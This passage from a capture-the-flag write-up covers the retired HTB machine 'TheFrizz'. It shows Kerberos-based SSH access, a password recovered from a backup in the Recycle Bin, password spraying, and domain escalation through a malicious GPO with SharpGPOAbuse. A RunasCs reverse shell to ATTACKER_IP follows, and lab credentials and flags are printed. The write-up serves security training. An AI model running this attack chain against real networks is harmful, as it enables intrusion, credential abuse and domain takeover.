The `FRIZZ.HTB` domain is added to `/etc/krb5.conf`.

```
fcoomans@kali:~/htb/thefrizz$ cat /etc/krb5.conf
[libdefaults]
        default_realm = FRIZZ.HTB

# The following krb5.conf variables are only for MIT Kerberos.
        kdc_timesync = 1
        ccache_type = 4
        forwardable = true
        proxiable = true
        rdns = false

        allow_weak_crypto = true


# The following libdefaults parameters are only for Heimdal Kerberos.
        fcc-mit-ticketflags = true

[realms]
        FRIZZ.HTB = {
                kdc = frizzdc.frizz.htb
                admin_server = frizzdc.frizz.htb
                default_domain = frizz.htb
        }

[domain_realm]
        .frizz.htb = FRIZZ.HTB
        frizz.htb = FRIZZ.HTB
```

Fiona is a `Remote Management Users` member, but there are no WinRM `5985` or `5986` ports open, which means `evil-winrm` cannot be used to connect to the target.

But port `22/tcp` (SSH) was available.  I look at the `sshd_config` file and notice that `Remote Management Users` can SSH to the target, but not with a password (`PasswordAuthentication no`) only using Kerberos (`GSSAPIAuthentication yes`).

```
PS C:\Users\W522A~1.WEB\AppData\Local\Temp> type C:\ProgramData\ssh\sshd_config
type C:\ProgramData\ssh\sshd_config

<SNIP>

# Authentication:

LoginGraceTime 1m
PermitRootLogin no
StrictModes yes
#MaxAuthTries 6
MaxSessions 3

PubkeyAuthentication no

# The default is to check both .ssh/authorized_keys and .ssh/authorized_keys2
# but this is overridden so installations will only check .ssh/authorized_keys
AuthorizedKeysFile      .ssh/authorized_keys

#AuthorizedPrincipalsFile none

# For this to work you will also need host keys in %programData%/ssh/ssh_known_hosts
HostbasedAuthentication no
# Change to yes if you don't trust ~/.ssh/known_hosts for
# HostbasedAuthentication
IgnoreUserKnownHosts yes
# Don't read the user's ~/.rhosts and ~/.shosts files
IgnoreRhosts yes

# To disable tunneled clear text passwords, change to no here!
PasswordAuthentication no
PermitEmptyPasswords no

# GSSAPI options
GSSAPIAuthentication yes

AllowAgentForwarding no
AllowTcpForwarding no
#GatewayPorts no
PermitTTY yes
PrintMotd yes
#PrintLastLog yes
#TCPKeepAlive yes
#UseLogin no
#PermitUserEnvironment no
ClientAliveInterval 120
ClientAliveCountMax 3
#UseDNS no
#PidFile /var/run/sshd.pid
#MaxStartups 10:30:100
PermitTunnel no
#ChrootDirectory none
#VersionAddendum none

# no default banner path
Banner "This is a production server, not a field trip. Please be responsible. -Marvin"

# override default of no subsystems
Subsystem       sftp    sftp-server.exe
#Subsystem powershell C:/progra~1/powershell/7/pwsh.exe -sshs
Subsystem powershell C:/progra~1/powershell/7/pwsh.exe -sshs

# Example of overriding settings on a per-user basis
#Match User anoncvs
#       AllowTcpForwarding no
#       PermitTTY no
#       ForceCommand cvs server

Match Group administrators
       AuthorizedKeysFile __PROGRAMDATA__/ssh/administrators_authorized_keys
DenyGroups "Frizz/Administrators"
AllowGroups "Frizz/Remote Management Users"
AllowUsers Frizz/m.schoolbus Frizz/f.frizzle
```

### 🧪 Exploitation

`ntpdate` is used again to sync the attack host's time with the target.

```
fcoomans@kali:~/htb/thefrizz$ sudo ntpdate frizzdc.frizz.htb
2025-07-22 15:15:06.422546 (+0200) +148.922391 +/- 0.082922 frizzdc.frizz.htb 10.10.11.60 s1 no-leap
CLOCK: time stepped by 148.922391
```

And then a Kerberos ticket granting ticket (`TGT`) is requested for Fiona.

```
fcoomans@kali:~/htb/thefrizz$ impacket-getTGT -dc-ip 10.10.11.60 'FRIZZ.HTB/f.frizzle:Jenni_Luvs_Magic23'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in f.frizzle.ccache

fcoomans@kali:~/htb/thefrizz$ export KRB5CCNAME=f.frizzle.ccache

fcoomans@kali:~/htb/thefrizz$ klist
Ticket cache: FILE:f.frizzle.ccache
Default principal: f.frizzle@FRIZZ.HTB

Valid starting       Expires              Service principal
07/22/2025 13:40:12  07/22/2025 23:40:12  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 07/23/2025 13:40:11
```

`ssh` is told to use the TGT to connect to the target by using the GSSAPI/Kerberos (`-K`) flag.

```
fcoomans@kali:~/htb/thefrizz$ ssh -K f.frizzle@frizzdc.frizz.htb
PowerShell 7.4.5
PS C:\Users\f.frizzle> whoami
frizz\f.frizzle
```

### 💰 Post Exploitation

#### 🚩 user.txt

Fiona holds the `user.txt` flag.

```
PS C:\Users\f.frizzle> type C:\Users\f.frizzle\Desktop\user.txt
type C:\Users\f.frizzle\Desktop\user.txt
e51b4afc2ce5ff384ec532e5e7b82e29
```

## 🔼 PrivEsc to M.SchoolBus

### 🔎 Recon

`whoami /user` shows that Fiona's SID is `S-1-5-21-2386970044-1145388522-2932701813-1103`.

```
PS C:\Users\f.frizzle> whoami /user

USER INFORMATION
----------------

User Name       SID
=============== ==============================================
frizz\f.frizzle S-1-5-21-2386970044-1145388522-2932701813-1103
```

Some delete files for Fiona (notice the SID) is found in the Recycle Bin.

```
PS C:\Users\f.frizzle> gci 'C:\$RECYCLE.BIN\' -Force -Recurse

    Directory: C:\$RECYCLE.BIN

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d--hs          10/29/2024  7:31 AM                S-1-5-21-2386970044-1145388522-2932701813-1103

    Directory: C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a---          10/29/2024  7:31 AM            148 $IE2XMEG.7z
-a---          10/24/2024  9:16 PM       30416987 $RE2XMEG.7z
-a-hs          10/29/2024  7:31 AM            129 desktop.ini
```

`scp` is used to copy the larger 7zip archive to the attack host.

```
fcoomans@kali:~/htb/thefrizz$ scp -o GSSAPIAuthentication=yes f.frizzle@frizzdc.frizz.htb:'C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z' .
$RE2XMEG.7z                                         100%   29MB   1.4MB/s   00:21
```

### 🧪 Exploitation

The file is extracted.

```
fcoomans@kali:~/htb/thefrizz$ mkdir loot

fcoomans@kali:~/htb/thefrizz$ mv \$RE2XMEG.7z loot

fcoomans@kali:~/htb/thefrizz$ cd loot

fcoomans@kali:~/htb/thefrizz/loot$ 7z x \$RE2XMEG.7z
```

It contains a `wapt` server backup.  

```
fcoomans@kali:~/htb/thefrizz/loot$ ls
'$RE2XMEG.7z'   wapt

fcoomans@kali:~/htb/thefrizz/loot$ cd wapt

fcoomans@kali:~/htb/thefrizz/loot/wapt$ ls
auth_module_ad.py  keyfinder.py  revision.txt             ssl                       wapt-enterprise.ico    waptmessage.exe       waptservice.exe       wgetwads64.exe
cache              keys          Scripts                  templates                 wapt-get.exe           waptpackage.py        wapt-signpackages.py
common.py          languages     setupdevhelpers.py       trusted_external_certs    wapt-get.exe.manifest  wapt.psproj           wapttftpserver
conf               lib           setuphelpers_linux.py    unins000.msg              wapt-get.ini           waptpython.exe        wapttftpserver.exe
conf.d             licencing.py  setuphelpers_macos.py    version-full              wapt-get.ini.tmpl      waptpythonw.exe       wapttray.exe
COPYING.txt        log           setuphelpers.py          waptbinaries.sha256       wapt-get.py            wapt-scanpackages.py  waptutils.py
db                 private       setuphelpers_unix.py     waptconsole.exe.manifest  waptguihelper.pyd      waptself.exe          waptwua
DLLs               __pycache__   setuphelpers_windows.py  waptcrypto.py             waptlicences.pyd       waptserver.exe        wgetwads32.exe
```

The `conf/waptserver.ini` file contains a base64-encoded password.

```
fcoomans@kali:~/htb/thefrizz/loot/wapt$ cd conf

fcoomans@kali:~/htb/thefrizz/loot/wapt/conf$ ls
ca-192.168.120.158.crt  ca-192.168.120.158.pem  forward_ssl_auth.conf  require_ssl_auth.conf  uwsgi_params  waptserver.ini  waptserver.ini.template

fcoomans@kali:~/htb/thefrizz/loot/wapt/conf$ grep -i password *
waptserver.ini:wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
waptserver.ini.template:#db_password=
waptserver.ini.template:wapt_password=
```

The password decodes to `!suBcig@MehTed!R`.

```
fcoomans@kali:~/htb/thefrizz$ echo -n IXN1QmNpZ0BNZWhUZWQhUgo= |base64 -d
!suBcig@MehTed!R
```

A password spraying attack against the domain users, shows that this password was also used for user `M.SchoolBus`!

```
fcoomans@kali:~/htb/thefrizz$ cat domain_users.txt
Administrator
Guest
krbtgt
f.frizzle
w.li
h.arm
M.SchoolBus
d.hudson
k.franklin
l.awesome
t.wright
r.tennelli
J.perlstein
a.perlstein
p.terese
v.frizzle
g.frizzle
c.sandiego
c.ramon
m.ramon
w.Webservice

fcoomans@kali:~/htb/thefrizz$ nxc smb frizzdc.frizz.htb -u domain_users.txt -p '!suBcig@MehTed!R' -k
SMB         frizzdc.frizz.htb 445    frizzdc          [*]  x64 (name:frizzdc) (domain:frizz.htb) (signing:True) (SMBv1:False) (NTLM:False)
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Administrator:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\Guest:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\krbtgt:!suBcig@MehTed!R KDC_ERR_CLIENT_REVOKED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\f.frizzle:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\w.li:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] frizz.htb\h.arm:!suBcig@MehTed!R KDC_ERR_PREAUTH_FAILED
SMB         frizzdc.frizz.htb 445    frizzdc          [-] Error checking if user is admin on frizzdc.frizz.htb: The NETBIOS connection with the remote host timed out.
SMB         frizzdc.frizz.htb 445    frizzdc          [+] frizz.htb\M.SchoolBus:!suBcig@MehTed!R
```

A TGT is requested for `M.SchoolBus`.

```
fcoomans@kali:~/htb/thefrizz$ sudo ntpdate frizzdc.frizz.htb
2025-07-23 17:43:49.761599 (+0200) +289.697989 +/- 0.082687 frizzdc.frizz.htb 10.10.11.60 s1 no-leap
CLOCK: time stepped by 289.697989

fcoomans@kali:~/htb/thefrizz$ impacket-getTGT -dc-ip 10.10.11.60 'FRIZZ.HTB/m.schoolbus:!suBcig@MehTed!R'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in m.schoolbus.ccache

fcoomans@kali:~/htb/thefrizz$ export KRB5CCNAME=m.schoolbus.ccache

fcoomans@kali:~/htb/thefrizz$ klist
Ticket cache: FILE:m.schoolbus.ccache
Default principal: m.schoolbus@FRIZZ.HTB

Valid starting       Expires              Service principal
07/23/2025 17:42:21  07/24/2025 03:42:21  krbtgt/FRIZZ.HTB@FRIZZ.HTB
        renew until 07/24/2025 17:37:40
```

### 💰 Post Exploitation

The TGT is used to SSH to the target as `M.SchoolBus`.

```
fcoomans@kali:~/htb/thefrizz$ ssh -K m.schoolbus@frizzdc.frizz.htb
PowerShell 7.4.5
PS C:\Users\M.SchoolBus> whoami
frizz\m.schoolbus
```

## 🔗 GPO Link Abuse

### 🔎 Recon

BloodHound shows that `M.SchoolBus` has `WriteGPLink` to the `DOMAIN CONTROLLERS` Organization Unit (OU), which contains the Domain Controller (DC) `frizzdc.frizz.htb`.

This means that `M.SchoolBus` can manipulate GPOs on the `DOMAIN CONTROLLERS` OU that can impact directly on the DC.

![](images/Pasted%20image%2020250822143159.png)

### 🧪 Exploitation

`SharpGPOAbuse` (https://github.com/FSecureLABS/SharpGPOAbuse) can be used to add a user as a local Admin.
Pre-compiled binaries can be found at https://github.com/byronkg/SharpGPOAbuse.

I download the pre-compiled `SharpGPOAbuse` binary and use `scp` to copy it to the target.

```
fcoomans@kali:~/htb/thefrizz$ wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
--2025-07-23 17:52:31--  https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
Resolving github.com (github.com)... 20.87.245.0
Connecting to github.com (github.com)|20.87.245.0|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/310712485/9978d100-38b5-11eb-8c1d-3ad8cf9c0968?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-07-22T09%3A41%3A26Z&rscd=attachment%3B+filename%3DSharpGPOAbuse.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-07-22T08%3A40%3A53Z&ske=2025-07-22T09%3A41%3A26Z&sks=b&skv=2018-11-09&sig=CYzq%2F8WLbjoT95FFGOaRPS1DK%2FTpX%2FdY5kNsi%2F3vJPk%3D&jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1MzE3NDUzOSwibmJmIjoxNzUzMTc0MjM5LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L_0OoBOdY15d4e_BCND0sBmWVmPltRUxQ9ctIbzz-M8&response-content-disposition=attachment%3B%20filename%3DSharpGPOAbuse.exe&response-content-type=application%2Foctet-stream [following]
--2025-07-23 17:52:31--  https://release-assets.githubusercontent.com/github-production-release-asset/310712485/9978d100-38b5-11eb-8c1d-3ad8cf9c0968?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-07-22T09%3A41%3A26Z&rscd=attachment%3B+filename%3DSharpGPOAbuse.exe&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-07-22T08%3A40%3A53Z&ske=2025-07-22T09%3A41%3A26Z&sks=b&skv=2018-11-09&sig=CYzq%2F8WLbjoT95FFGOaRPS1DK%2FTpX%2FdY5kNsi%2F3vJPk%3D&jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1MzE3NDUzOSwibmJmIjoxNzUzMTc0MjM5LCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.L_0OoBOdY15d4e_BCND0sBmWVmPltRUxQ9ctIbzz-M8&response-content-disposition=attachment%3B%20filename%3DSharpGPOAbuse.exe&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.110.133, 185.199.111.133, 185.199.109.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 80896 (79K) [application/octet-stream]
Saving to: ‘SharpGPOAbuse.exe’

SharpGPOAbuse.exe     100%[=======================>]  79.00K  --.-KB/s    in 0.004s

2025-07-23 17:52:31 (17.1 MB/s) - ‘SharpGPOAbuse.exe’ saved [80896/80896]

fcoomans@kali:~/htb/thefrizz$ scp -o GSSAPIAuthentication=yes SharpGPOAbuse.exe m.schoolbus@frizzdc.frizz.htb:'C:/Users/M.SchoolBus/AppData/Local/Temp'
SharpGPOAbuse.exe                                                                                                                        100%   79KB 161.6KB/s   00:00
```

The goal is to make `M.SchoolBus` an Administrator, but the `sshd_config` showed that Administrators are Denied from SSH.  This means that `M.SchoolBus` will not be allowed to SSH to the server and the current session, after being promoted to Administrator won't have Administrator privileges.

I therefore also download `RunasCs` to start a reverse shell as `M.SchoolBus` (who will be a member of the Administrators group).  `scp` is once again used to copy the file to the target.

```
fcoomans@kali:~/htb/thefrizz$ wget https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
--2025-07-23 18:00:18--  https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip
Resolving github.com (github.com)... 20.87.245.0
Connecting to github.com (github.com)|20.87.245.0|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-07-22T09%3A49%3A37Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-07-22T08%3A48%3A50Z&ske=2025-07-22T09%3A49%3A37Z&sks=b&skv=2018-11-09&sig=abla3NQrKpwmFHYbcd30dS8nmPNr4FEtqERwHvPc02M%3D&jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1MzE3NTEwMSwibmJmIjoxNzUzMTc0ODAxLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.QcGItL5X1M4hw1yN3HzQsIUibTXzZNREEk5m0qwpuBY&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream [following]
--2025-07-23 18:00:19--  https://release-assets.githubusercontent.com/github-production-release-asset/201331135/46cefc59-1a1e-4e32-8b47-864a11159984?sp=r&sv=2018-11-09&sr=b&spr=https&se=2025-07-22T09%3A49%3A37Z&rscd=attachment%3B+filename%3DRunasCs.zip&rsct=application%2Foctet-stream&skoid=96c2d410-5711-43a1-aedd-ab1947aa7ab0&sktid=398a6654-997b-47e9-b12b-9515b896b4de&skt=2025-07-22T08%3A48%3A50Z&ske=2025-07-22T09%3A49%3A37Z&sks=b&skv=2018-11-09&sig=abla3NQrKpwmFHYbcd30dS8nmPNr4FEtqERwHvPc02M%3D&jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmVsZWFzZS1hc3NldHMuZ2l0aHVidXNlcmNvbnRlbnQuY29tIiwia2V5Ijoia2V5MSIsImV4cCI6MTc1MzE3NTEwMSwibmJmIjoxNzUzMTc0ODAxLCJwYXRoIjoicmVsZWFzZWFzc2V0cHJvZHVjdGlvbi5ibG9iLmNvcmUud2luZG93cy5uZXQifQ.QcGItL5X1M4hw1yN3HzQsIUibTXzZNREEk5m0qwpuBY&response-content-disposition=attachment%3B%20filename%3DRunasCs.zip&response-content-type=application%2Foctet-stream
Resolving release-assets.githubusercontent.com (release-assets.githubusercontent.com)... 185.199.111.133, 185.199.109.133, 185.199.108.133, ...
Connecting to release-assets.githubusercontent.com (release-assets.githubusercontent.com)|185.199.111.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 39889 (39K) [application/octet-stream]
Saving to: ‘RunasCs.zip’

RunasCs.zip                                100%[=======================================================================================>]  38.95K  --.-KB/s    in 0.003s

2025-07-23 18:00:19 (13.6 MB/s) - ‘RunasCs.zip’ saved [39889/39889]


fcoomans@kali:~/htb/thefrizz$ unzip RunasCs.zip
Archive:  RunasCs.zip
  inflating: RunasCs.exe
  inflating: RunasCs_net2.exe

fcoomans@kali:~/htb/thefrizz$ scp -o GSSAPIAuthentication=yes RunasCs.exe m.schoolbus@frizzdc.frizz.htb:'C:/Users/M.SchoolBus/AppData/Local/Temp'
RunasCs.exe                                                                                                                              100%   51KB 103.4KB/s   00:00
```

Now for the magic!  

First, I create an empty malicious GPO.

```
PS C:\Users\M.SchoolBus\AppData\Local\Temp> New-GPO -Name MaliciousGPO

DisplayName      : MaliciousGPO
DomainName       : frizz.htb
Owner            : frizz\M.SchoolBus
Id               : fe31cf74-b10c-40e7-88be-57a53f2ac036
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 7/23/2025 9:11:36 AM
ModificationTime : 7/23/2025 9:11:36 AM
UserVersion      :
ComputerVersion  :
WmiFilter        :
```

And link it to the `DOMAIN CONTROLLERS` OU.

```
PS C:\Users\M.SchoolBus\AppData\Local\Temp> New-GPLink -Name MaliciousGPO -Target "OU=DOMAIN CONTROLLERS,DC=FRIZZ,DC=HTB"

GpoId       : fe31cf74-b10c-40e7-88be-57a53f2ac036
DisplayName : MaliciousGPO
Enabled     : True
Enforced    : False
Target      : OU=Domain Controllers,DC=frizz,DC=htb
Order       : 2
```

I then use `SharpGPOAbuse` to modify the Malicious GPO to add user `M.SchoolBus` as a local Admin.

```
PS C:\Users\M.SchoolBus\AppData\Local\Temp> .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount m.schoolbus --GPOName 'MaliciousGPO'
[+] Domain = frizz.htb
[+] Domain Controller = frizzdc.frizz.htb
[+] Distinguished Name = CN=Policies,CN=System,DC=frizz,DC=htb
[+] SID Value of m.schoolbus = S-1-5-21-2386970044-1145388522-2932701813-1106
[+] GUID of "MaliciousGPO" is: {FE31CF74-B10C-40E7-88BE-57A53F2AC036}
[+] Creating file \\frizz.htb\SysVol\frizz.htb\Policies\{FE31CF74-B10C-40E7-88BE-57A53F2AC036}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
[+] versionNumber attribute changed successfully
[+] The version number in GPT.ini was increased successfully.
[+] The GPO was modified to include a new local admin. Wait for the GPO refresh cycle.
[+] Done!
```

`gpupdate /force` forces the GPO to be applied immediately.

```
PS C:\Users\M.SchoolBus\AppData\Local\Temp> gpupdate /force
Updating policy...

Computer Policy update has completed successfully.
User Policy update has completed successfully.
```

A `nc` listener is started on the attack host.

```
fcoomans@kali:~/htb/thefrizz$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
```

And `RunAsCs` is used to start a reverse shell as user `M.SchoolBus`.  Remember that the new process will be started as user `M.SchoolBus`, who now has Administrator privileges.

```
PS C:\Users\M.SchoolBus\AppData\Local\Temp> .\RunasCs.exe m.schoolbus '!suBcig@MehTed!R' powershell.exe -r ATTACKER_IP:4444

[+] Running in session 0 with process function CreateProcessWithLogonW()
[+] Using Station\Desktop: Service-0x0-1acd78$\Default
[+] Async process 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe' with pid 1544 created in background.
```

The `nc` listener catches the reverse shell.

`whoami /groups` shows that `M.SchoolBus` is now a member of the `Administrators` group.

```
fcoomans@kali:~/htb/thefrizz$ rlwrap nc -lvnp 4444
listening on [any] 4444 ...
connect to [ATTACKER_IP] from (UNKNOWN) [10.10.11.60] 63927
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Windows\system32> whoami
whoami
frizz\m.schoolbus
PS C:\Windows\system32> whoami /groups
whoami /groups

GROUP INFORMATION
-----------------

Group Name                                   Type             SID                                            Attributes
============================================ ================ ============================================== ===============================================================
Everyone                                     Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users              Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Administrators                       Alias            S-1-5-32-544                                   Mandatory group, Enabled by default, Enabled group, Group owner
BUILTIN\Users                                Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access   Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                     Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                                Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users             Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization               Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
frizz\Desktop Admins                         Group            S-1-5-21-2386970044-1145388522-2932701813-1121 Mandatory group, Enabled by default, Enabled group
frizz\Group Policy Creator Owners            Group            S-1-5-21-2386970044-1145388522-2932701813-520  Mandatory group, Enabled by default, Enabled group
frizz\Denied RODC Password Replication Group Alias            S-1-5-21-2386970044-1145388522-2932701813-572  Mandatory group, Enabled by default, Enabled group, Local Group
NT AUTHORITY\NTLM Authentication             Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level         Label            S-1-16-12288
```

### 💰 Post Exploitation

#### 🏆 root.txt

`M.SchoolBus` can now access the `Administrator` account home directory.

`Administrator` holds the `root.txt` flag.

```
PS C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
c19dbef0b4892240056ccf7e1abf1a86
```

Turns out, when you let a school bus driver write GPOs, the only field trip is straight to Domain Admin. 🚌

And `TheFrizz has been Pwned!` 🎉

![](images/Pasted%20image%2020250722111647.png)

## 📚 Lessons Learned

- **Recycle Bin Artifacts Matter**: Deleted files aren’t always gone — Fiona’s forgotten backup archive spilled credentials that shouldn’t have been lying around.
- **Password Reuse is Dangerous**: M.SchoolBus' recycled credentials across multiple services allowed lateral movement straight into a high-value account.
- **Excessive GPO Permissions**: Granting `WriteGPLink` on the `DOMAIN CONTROLLERS` OU let M.SchoolBus escalate to Domain Admin with a single malicious GPO. Misconfigured delegation is a gift to attackers.
- **SSH Restrictions Aren’t Enough**: Blocking administrators from SSH didn’t stop privilege escalation — `RunasCs` and reverse shells easily bypassed that restriction.

## ⚠️ Disclaimer

This write-up covers a retired HTB machine and is for educational purposes only. All IPs, credentials, and flags exist in a lab environment. My username matches my GitHub handle and is intentionally used to build my cybersecurity brand.
